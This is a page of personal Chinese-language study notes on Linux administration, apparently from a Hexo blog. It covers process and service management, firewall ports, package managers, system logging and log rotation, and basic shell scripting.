<h4 id="kill-killall"><a href="#kill-killall" class="headerlink" title="kill killall"></a>kill killall</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kill [pid]		终止进程</span><br><span class="line">	ps -aux | grep sshd</span><br><span class="line">	root       1213  0.0  0.2 112900  4316 ?        Ss   10:37   0:00 /usr/sbin/sshd -D</span><br><span class="line">	kill 1213	此时已登录上来的保持登录 不能再上线新用户</span><br><span class="line">	/bin.systemstl start sshd.service		重启ssh服务  此时可以继续连接用户</span><br><span class="line">终止多个 killall</span><br><span class="line">	killall gedit				所有gedit打开的文本编辑器都被关闭</span><br><span class="line">	kill -9 [比如某个终端pid]		-9表示强制终止</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h4 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">进程树</span><br><span class="line">	-p 显示pid</span><br><span class="line">	-u 显示进程的用户</span><br></pre></td></tr></table></figure>

<h3 id="p73-服务管理"><a href="#p73-服务管理" class="headerlink" title="p73 服务管理"></a>p73 服务管理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">	服务本质就是进程，运行再后台，通常监听某个端口，等待其他程序的请求，比如mysqld，sshd，防火墙，也成为守护进程</span><br><span class="line">	centos7.0之前用service 服务名称 [start|stop|restart|reload|status] </span><br><span class="line">	centos7.0之后用systemctl [start|stop|restart|reload|status] 服务名称</span><br><span class="line">	</span><br><span class="line">查看服务名</span><br><span class="line">	setup 可以看到全部  前面带*号表示自动启动  空格取消 tab键退出</span><br><span class="line">	/etc/init.d 只能看到一部分</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h4 id="运行级别"><a href="#运行级别" class="headerlink" title="运行级别"></a>运行级别</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">运行级别介绍	通常3和5</span><br><span class="line">	0 停机状态 不能正常启动</span><br><span class="line">	1 单用户 找回丢失密码 root权限 用于系统维护 禁止远程登录	</span><br><span class="line">	2 多用户状态（没有NFS）没有网络服务</span><br><span class="line">	3 多用户状态有网络服务 无界面 登录后进入控制台命令行</span><br><span class="line">	4 系统未使用保留给用户</span><br><span class="line">	5 图形界面</span><br><span class="line">	6 系统重启 默认补课设为6</span><br><span class="line">init 0 即关机</span><br><span class="line">init 5 使用图形界面</span><br><span class="line">init 3 终端界面</span><br><span class="line">/etc/inittab		配置文件</span><br><span class="line"></span><br><span class="line">systemctl get-default 查看当前运行级别</span><br><span class="line">systemctl set-default multi-user.target		设置成多用户3级别</span><br><span class="line">	开机流程-》BIOS-》/boot（程序引导）-》systemd进程1-》运行级别-》运行级别对应服务</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chkconfig</span><br><span class="line">	给服务在各个运行级别设置自 启动/关闭</span><br><span class="line">	chkconfig 指令管理的服务在/etc/init.d目录查看</span><br><span class="line">	centos7以后很多服务使用systemctl管理</span><br><span class="line">	语法</span><br><span class="line">		chkconfig --list</span><br><span class="line">		chkconfig 服务名 --list</span><br><span class="line">		chkconfig --level [number] 服务名 on/off</span><br><span class="line">	reboot生效</span><br></pre></td></tr></table></figure>

<h4 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">管理指令</span><br><span class="line">	systemctl [start|stop|restart|statue] 服务名</span><br><span class="line">	systemctl指令管理的服务是在/usr/lib/systemd/system目录下查看</span><br><span class="line">		e.g. ll /usr/lib/systemd/system   -&gt;firewalld.service</span><br><span class="line">设置服务自启动和状态</span><br><span class="line">	systemctl list-uint-files 		查看所有服务的自启动状态</span><br><span class="line">	systemctl enable [服务名]		  设置服务开机启动</span><br><span class="line">	systemctl disable [服务名]		  关闭...</span><br><span class="line">	systemctl is-enabled [服务名]    查询某个服务是否自启动</span><br><span class="line">	</span><br><span class="line">	systemctl status firewalld</span><br></pre></td></tr></table></figure>

<h4 id="firewall"><a href="#firewall" class="headerlink" title="firewall"></a>firewall</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">打开端口</span><br><span class="line">	firewall-cmd --permanent --add-port=[端口号]/[协议]</span><br><span class="line">关闭端口</span><br><span class="line">	firewall-cmd --permanent --remove-port=[端口号]/[协议号]</span><br><span class="line">重新载入才能生效</span><br><span class="line">	firewall-cmd --reload</span><br><span class="line">查询端口是否开放</span><br><span class="line">	firewall-cmd --query-port=[端口]/[协议号]			？？</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在windows cmd使用telnet检测</span><br><span class="line">	telnet 192.168.213.135 111</span><br><span class="line">	先开放端口然后重新载入然后就可以telnet了</span><br></pre></td></tr></table></figure>

<h3 id="p78-动态监控"><a href="#p78-动态监控" class="headerlink" title="p78 动态监控"></a>p78 动态监控</h3><h4 id="top"><a href="#top" class="headerlink" title="top"></a>top</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">与ps类似，top在执行一段时间可以更新正在运行的进程</span><br><span class="line">参数</span><br><span class="line">	-d 默认3秒</span><br><span class="line">	-i 不显示任何闲置或者僵死进程</span><br><span class="line">	-p 通过监控进程ID来仅仅监控某个进程的状态</span><br><span class="line">前5行</span><br><span class="line">	https://www.cnblogs.com/kaibindirver/p/14960098.html</span><br><span class="line">top中的交互</span><br><span class="line">	P	cpu使用率排序 默认此项</span><br><span class="line">	M 	内存使用率排序</span><br><span class="line">	N 	PID排序</span><br><span class="line">	q	退出</span><br><span class="line">	u	输入用户</span><br><span class="line">	k	删除进程</span><br></pre></td></tr></table></figure>

<h4 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看系统网络情况</span><br><span class="line">	参数</span><br><span class="line">		-an	按一定顺序输出</span><br><span class="line">		-p	显示哪个进程在调用</span><br><span class="line">	netstat -an | more</span><br><span class="line">	此处开了5个终端，foreign address监听192.168.213.1的5个端口</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665469768306.png" alt="1665469768306"></p>
<h3 id="p82-rpm包的管理"><a href="#p82-rpm包的管理" class="headerlink" title="p82 rpm包的管理"></a>p82 rpm包的管理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">rpm用于互联网下载的打包及安装工具，它包含于某些linux分发版。它生成.RPM扩展名文件。RPM是RedHat Package Manager缩写。类似windows的setup.</span><br><span class="line">简单查询指令		-q</span><br><span class="line">	rpm -qa				显示全部</span><br><span class="line">	rpm -q firefox		查询火狐装了没</span><br><span class="line">	rpm -qi firefox		查询火狐软件包信息</span><br><span class="line">	rpm -ql firefox		查询火狐软件包中的文件</span><br><span class="line">	rpm -qf	/etc/passwd 查文件所属软件包	查出来是setup这个包</span><br><span class="line">基本格式</span><br><span class="line">	firefox-68.10.0-1.el7.centos.x86_64</span><br><span class="line">	版本号			  68.10.0-1</span><br><span class="line">	适用操作系统		el7.centos.x86_64</span><br><span class="line">		el			enterprise linux缩写</span><br><span class="line">		7			内核</span><br><span class="line">		x86_64		64位</span><br><span class="line">		i686、i386	32位</span><br><span class="line">		noarch		表示通用</span><br><span class="line">卸载</span><br><span class="line">	rpm -e [包名 不必全名]		//erase</span><br><span class="line">	可能导致依赖问题	--nodeps强制删除</span><br><span class="line">安装</span><br><span class="line">	rpm -ivh [RPM包全路径]</span><br><span class="line">		-i install</span><br><span class="line">		-v verbose	提示</span><br><span class="line">		-h hash		进度条</span><br></pre></td></tr></table></figure>

<h3 id="p84-yum"><a href="#p84-yum" class="headerlink" title="p84 yum"></a>p84 yum</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Shell前端软件包管理器，基于rpm管理，能够从指定服务器自动下载RPM包并安装，可以自主处理依赖关系，并一次性安装所有依赖的软件包</span><br><span class="line">yum list | more			软件列表</span><br><span class="line">yum install xxx</span><br></pre></td></tr></table></figure>

<h2 id="p86-89-关于JDK8-tomcat8-idea2020-mysql5-7安装没看"><a href="#p86-89-关于JDK8-tomcat8-idea2020-mysql5-7安装没看" class="headerlink" title="p86-89 关于JDK8 tomcat8 idea2020 mysql5.7安装没看"></a>p86-89 关于JDK8 tomcat8 idea2020 mysql5.7安装没看</h2><h3 id="p110-ubuntu"><a href="#p110-ubuntu" class="headerlink" title="p110_ubuntu"></a>p110_ubuntu</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安装虚拟机随便点点 2204</span><br><span class="line">sudo passwd设定root密码</span><br><span class="line"></span><br><span class="line">apt是Advanced Packaging Tool简称</span><br><span class="line">/etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665846687243.png" alt="1665846687243"></p>
<h3 id="p113-APT更新源和实例"><a href="#p113-APT更新源和实例" class="headerlink" title="p113 APT更新源和实例"></a>p113 APT更新源和实例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update				更新源</span><br><span class="line">sudo apt-get upgrade			更新已安装的包</span><br><span class="line">sudo apt-get install package	安装包</span><br><span class="line">sudo apt-get remove package		删除包</span><br><span class="line">sudo apt-get <span class="built_in">source</span> package		下载该包的源代码</span><br><span class="line"></span><br><span class="line">更新镜像源及实例</span><br><span class="line">	将https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/内容整个覆盖/etc/apt/sources.list</span><br><span class="line">	apt-get install vim</span><br><span class="line">	apt-get remove vim</span><br><span class="line">	apt-cache show vim		获取软件信息</span><br></pre></td></tr></table></figure>

<h3 id="p114-远程和集群"><a href="#p114-远程和集群" class="headerlink" title="p114 远程和集群"></a>p114 远程和集群</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh		Secure shell</span><br><span class="line">	是建立在应用层和传输层的安全协议</span><br><span class="line">	ubuntu默认没有安装sshd服务</span><br><span class="line">	netstat需要apt-get install net-tools才能使用</span><br><span class="line">	apt-get install openssh-server</span><br><span class="line">	service sshd restart</span><br><span class="line">	只能用hyy 123登录然后su root 123456Hyy。。。不知道为什么</span><br></pre></td></tr></table></figure>

<h3 id="p117-Linux日志管理和实例"><a href="#p117-Linux日志管理和实例" class="headerlink" title="p117 Linux日志管理和实例"></a>p117 Linux日志管理和实例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">记录许多重要的系统事件，包括登录信息、系统启动信息、系统安全信息、邮件相关信息、各种服务相关信息等</span><br><span class="line">通过日志来检查错误发生的原因或者收到攻击时攻击者留下的痕迹</span><br><span class="line">系统日志文件保存地址</span><br><span class="line">	/var/log</span><br><span class="line">系统常用日志</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665933221199.png" alt="1665933221199"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/secure</span><br></pre></td></tr></table></figure>

<h3 id="p118-rsyslogd"><a href="#p118-rsyslogd" class="headerlink" title="p118 rsyslogd"></a>p118 rsyslogd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Centos6.x	syslogd</span><br><span class="line">Centos7.6	rsyslogd</span><br><span class="line"></span><br><span class="line">/etc/rsyslog.conf管理了日志服务</span><br><span class="line">ps -aux | grep &quot;rsyslog&quot; | grep -v &quot;grep&quot;</span><br><span class="line">	grep -v 反向匹配</span><br><span class="line">systemctl list-uint-files | grep rsyslog</span><br><span class="line">	rsyslogd记录的日志文件，日志文件格式包含以下4列：</span><br><span class="line">		1.事件产生的事件</span><br><span class="line">		2.产生事件的服务器的主机名</span><br><span class="line">		3.产生事件的服务器名或程序名</span><br><span class="line">		4.事件的具体信息</span><br><span class="line">	e.g.	/var/log/secure</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665998306817.png" alt="1665998306817"></p>
<h3 id="p120-自定义日志"><a href="#p120-自定义日志" class="headerlink" title="p120 自定义日志"></a>p120 自定义日志</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># /etc/rsyslog.conf中添加一个日志文件/var/log/hsp.log 当有事件发送时比如(sshd服务相关事件)，该文件会接受到信息并保存</span><br><span class="line">vim /etc/rsyslog.conf		#要往下拉</span><br><span class="line">#       增加自定义的日志		参考别人写的，这个是把所有的都写进去了</span><br><span class="line">*.*		/var/log/hsp.log</span><br><span class="line">reboot	事件就被写进去了</span><br></pre></td></tr></table></figure>

<h3 id="p121日志轮替"><a href="#p121日志轮替" class="headerlink" title="p121日志轮替"></a>p121日志轮替</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把旧的日志文件移动并改名，同时建立新的日志文件，当旧日志文件超出保存的范围之后就会进行删除</span><br></pre></td></tr></table></figure>

 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">日志轮替文件命名</span><br><span class="line">	使用logrotate进行日志轮替管理，通过/etc/logrotate.conf配置dateext参数</span><br><span class="line">		如果有这个参数，日志会使用日期来作为日志文件的后缀，e.g.secure-20221105,名字不会重叠秩序保存日志个数，删除多余的日志文件即可</span><br><span class="line">		若无dateext，即新生成secure，之前的secure--&gt;secure.1</span><br><span class="line">	下面的截图看注释，上面的是全局的设置，每周一次轮替，保存4份文件，日志轮替创建新的文件，使用日期作为日志轮替文件的后缀</span><br><span class="line">		下面是单独的设置，优先级高</span><br><span class="line">	include /etc/logrotate.d表示也可以把规则写到这个目录下</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1667655808332.png" alt="1667655808332"></p>
<h3 id="p122-自定日志轮替"><a href="#p122-自定日志轮替" class="headerlink" title="p122 自定日志轮替"></a>p122 自定日志轮替</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#需求	/var/log/hsp.log</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1667656547568.png" alt="1667656547568"></p>
<h3 id="p123-日志轮替机制"><a href="#p123-日志轮替机制" class="headerlink" title="p123 日志轮替机制"></a>p123 日志轮替机制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">机制	系统定时任务/etc/cron.daily/目录logrotate</span><br></pre></td></tr></table></figure>

<h3 id="p124-内存日志"><a href="#p124-内存日志" class="headerlink" title="p124 内存日志"></a>p124 内存日志</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">journalctl	#查看全部</span><br><span class="line">journalctl -n 3		#查看最新3条</span><br><span class="line">journalctl --since 19:00 --until 19:10:10</span><br><span class="line">journalctl -p err	#查看报错日志</span><br><span class="line">journalctl -o verbose	#日志详细内容</span><br><span class="line">journalctl | grep sshd</span><br><span class="line">journalctl查看的是内存日志，重启清空</span><br></pre></td></tr></table></figure>

<h2 id="Shell-编程"><a href="#Shell-编程" class="headerlink" title="Shell 编程"></a>Shell 编程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">命令行解释器 为用户提供一个向Linux内核发送请求以便运行程序的界面系统级程序用户可以用Shell来启动、挂起、停止、编写一些程序</span><br><span class="line">由内到外依次是硬件-》内核-》Shell-》外层应用程序</span><br><span class="line">脚本以#!/bin/bash开头 		表明使用什么shell</span><br><span class="line">需要可执行权限</span><br><span class="line">两种执行方式		chmod改</span><br><span class="line">	1.先chmod，然后bash hello.sh</span><br><span class="line">	2.sh hello.sh</span><br></pre></td></tr></table></figure>

<h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">系统变量		设定好的</span><br><span class="line">	$HOME $SHELL $USER</span><br><span class="line">变量习惯大写，这是规范</span><br><span class="line">set指令查看所有变量</span><br><span class="line">普通变量使用unset删除</span><br><span class="line">echo输出需要加上$</span><br><span class="line">	readonly B=2		#readon定义静态变量，不能unset</span><br><span class="line">vim普通模式下		:nu显示行号</span><br><span class="line">讲命令返回值赋给变量</span><br><span class="line">	A=`date`			#反引号</span><br><span class="line">	B=$(date)			#等价反引号</span><br></pre></td></tr></table></figure>

<h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/profile文件最后加上</span><br><span class="line">	export HYY_HOME=/home/hyy19</span><br><span class="line">source /etc/profile</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="位置参数变量"><a href="#位置参数变量" class="headerlink" title="位置参数变量"></a>位置参数变量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">类似python的argparse</span><br><span class="line">	$n	$0表示命令本身	$1-9按顺序 10以上$(10)</span><br><span class="line">	$*	全部</span><br><span class="line">	$@	全部 不过区分对待</span><br><span class="line">	$#	所有参数个数</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$$	当前进程的pid</span><br><span class="line">$!	后台运行最后一个进程的pid</span><br><span class="line">$?	上一个执行命令的返回状态 0 表正确执行 其他数字由命令自己执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">基本语法</span><br><span class="line">	$((运算式)) 或者 $[运算时] 或者 expr m + n // expression表达式</span><br><span class="line">	expression需要由空格</span><br><span class="line">	expr结果赋予某个变量，使用``		echo `expr 100 + 200`</span><br><span class="line">	expr m - n</span><br><span class="line">	expr \* / %		乘 除 取余		\是转义字符</span><br><span class="line">	e.g.  (2+3)*4</span><br><span class="line">		res1=$(((2+3)*4))</span><br><span class="line">		res2=$[(2+3)*4]</span><br><span class="line">		</span><br><span class="line">		tmp=`expr 2 + 3`</span><br><span class="line">		res4=`expr $tmp \* 4`</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line">	[condition]				前后需要空格</span><br><span class="line">	#非空返回true，可使用$?验证（0为true，&gt;1为false）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665549485878.png" alt="1665549485878"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要空格</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665549751894.png" alt="1665549751894"></p>
<h4 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h4><h5 id="if"><a href="#if" class="headerlink" title="if"></a>if</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if [条件判断式]</span><br><span class="line">then</span><br><span class="line">	代码</span><br><span class="line">elif</span><br><span class="line">then</span><br><span class="line">	代码</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h5 id="case"><a href="#case" class="headerlink" title="case"></a>case</h5><p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665550648907.png" alt="1665550648907"></p>
<h5 id="for"><a href="#for" class="headerlink" title="for"></a>for</h5><p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665551226182.png" alt="1665551226182"></p>
<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665551692016.png" alt="1665551692016"></p>
<h5 id="while"><a href="#while" class="headerlink" title="while"></a>while</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while [条件判断式]</span><br><span class="line">do</span><br><span class="line">	程序</span><br><span class="line">done</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665552125947.png" alt="1665552125947"></p>
<h4 id="p102-read-读取控制台输入"><a href="#p102-read-读取控制台输入" class="headerlink" title="p102 read 读取控制台输入"></a>p102 read 读取控制台输入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">选项</span><br><span class="line">	-p 指定读取时的提示符</span><br><span class="line">	-t 读取等待时间（秒）</span><br><span class="line">参数</span><br><span class="line">	变量名</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665554706206.png" alt="1665554706206"></p>
<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><h5 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">	basename [pathname] [suffix]	显示路径最后的文件名 suffix如果指定会把pathname或string中suffix去掉</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665555023107.png" alt="1665555023107"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirname		返回完整路径最后/的前面的部分，常用于返回路径部分</span><br></pre></td></tr></table></figure>

<h5 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function funname()&#123;</span><br><span class="line">	Action;</span><br><span class="line">	[return int;]</span><br><span class="line">&#125;</span><br><span class="line">调用直接写函数名		funname [值]</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1665555764080.png" alt="1665555764080"></p>
<h3 id="p105-定时备份数据库"><a href="#p105-定时备份数据库" class="headerlink" title="p105 定时备份数据库"></a>p105 定时备份数据库</h3><p>&#x2F;usr&#x2F;sbin&#x2F;p106_back_up.sh</p>
